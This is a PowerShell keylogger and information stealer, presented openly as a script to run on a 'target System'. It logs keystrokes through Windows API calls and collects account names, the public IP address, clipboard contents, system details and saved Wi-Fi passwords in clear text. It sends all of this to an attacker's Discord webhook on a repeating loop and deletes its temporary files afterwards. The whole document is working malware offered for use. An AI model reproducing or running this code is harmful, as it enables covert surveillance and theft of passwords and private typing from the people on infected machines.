
<#
============================================= Key Record Script ========================================================

SYNOPSIS
This script gathers Keypress information and posts to a discord webhook address with the results.

USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>

Do{
#===================== INPUT CREDENTIALS HERE =====================

$RunTimeP = 10 # Interval (in minutes) between each email
$whuri = "DISCORD_WEBHOOK_HERE"

#==================================================================

$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"
$userString+="Public Ip Address = "
$userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;}
"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"---------------------   CLIPBOARD INFO  -------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  WIFI INFO    --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append

$wifistring = " "
$Pathsys = "$env:temp\systeminfo.txt"
$msgsys = Get-Content -Path $Pathsys -Raw 
$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
Remove-Item -Path $Pathsys -force


Do{
$apip = 1
Start-Sleep 4
$ttrun = 1
$tstrt = Get-Date
$tend = $tstrt.addminutes($RunTimeP)
function Start-Logs($Path = "$env:temp\chars.txt") {$sigs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru  
$null = New-Item -Path $Path -ItemType File -Force
try{
    Start-Sleep 1
    $run = 0
	while ($ttrun  -ge $run) {                              
	while ($tend -ge $tnow) {
      Start-Sleep -Milliseconds 30
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767){
        $null = [console]::CapsLock
        $virtualKey = $API::MapVirtualKey($ascii, 3)
        $kbstate = New-Object Byte[] 256
        $checkkbstate = $API::GetKeyboardState($kbstate)
        $mychar = New-Object -TypeName System.Text.StringBuilder
        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
            if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
        $msg = Get-Content -Path $Path -Raw 
        $escmsg = $msg -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
        $json = @{"username" = "$env:COMPUTERNAME" 
                    "content" = $escmsg} | ConvertTo-Json
        Start-Sleep 1
        Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
        Start-Sleep 1
        Remove-Item -Path $Path -force
        }
        }
finally{}
}
Start-Logs
}While ($apip -le 5)
